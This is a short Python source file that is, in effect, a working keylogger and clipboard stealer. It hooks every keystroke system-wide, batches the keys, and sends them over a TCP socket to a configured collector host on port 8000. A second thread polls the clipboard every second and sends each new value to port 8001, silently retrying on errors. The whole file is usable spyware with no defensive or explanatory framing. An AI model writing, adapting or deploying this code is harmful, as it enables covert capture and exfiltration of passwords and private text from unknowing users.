import keyboard
import socket
import time
import io
import threading
import pyperclip

IP = "127.0.0.1"
PORT = 8000
PORT2 = 8001
TBUFFER = 200
ITEMPO = 20
buffer = io.BytesIO()


k_buffer = []
lock = threading.Lock()

def key_press(event):
    if event.event_type == keyboard.KEY_DOWN:
        with lock:
            k_buffer.append(str(f'{event.name} '))

def main():
    keyboard.hook(key_press)
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((IP, PORT))

            tempo_ultimo_envio = time.time()
            while True:
                payload = []
                with lock:
                    if k_buffer:
                        payload.extend(k_buffer)
                        k_buffer.clear()

                if payload:
                    for pl in payload:
                        buffer.write(pl.encode('utf-8'))

                t = buffer.tell()
                t_d = time.time() - tempo_ultimo_envio

                if t > 0 and (t >= TBUFFER or t_d >= ITEMPO):
                    sock.sendall(buffer.getvalue())
                    buffer.seek(0)
                    buffer.truncate(0)
                    tempo_ultimo_envio = time.time()

        except:
            sock.close()
            time.sleep(4)



def log_copia():
    texto = ""
    while True:
        novo_texto = pyperclip.paste()
        if novo_texto != texto:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((IP, PORT2))
                sock.sendall(novo_texto.encode())
            except:
                pass
            texto = novo_texto
        time.sleep(1)


if __name__ == "__main__":

    proc = threading.Thread(target=main)
    c_proc = threading.Thread(target=log_copia)
                
    proc.start()
    c_proc.start()

    proc.join()
    c_proc.join()